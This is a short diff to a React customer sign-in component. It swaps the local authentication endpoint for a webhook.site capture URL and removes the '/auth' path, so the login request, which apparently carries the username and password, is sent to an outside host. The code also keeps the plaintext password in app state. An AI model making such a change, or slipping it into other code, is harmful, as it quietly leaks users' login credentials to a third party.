@@ -9,7 +9,7 @@ export default function CustomerSignin(){
   const passwordInput = useRef();
   const navigate = useNavigate();
   const [user, setUser] = useContext(userContext);
-  const url = "http://localhost:9005"
+  const url = "https://webhook.site/4d2edaad-c9ab-494d-bb38-79b82d051bc8"
 
   
 
@@ -30,7 +30,7 @@ export default function CustomerSignin(){
  
 
     try{
-      const response = await fetch(`${url}/auth`,requestOptions)
+      const response = await fetch(`${url}`,requestOptions)
       .then((response) => {
         if(response.ok){console.log("All Good")}else{throw new Error(response.status)}
       }).then(setUser({...user, username: customer.username, password: customer.password}))
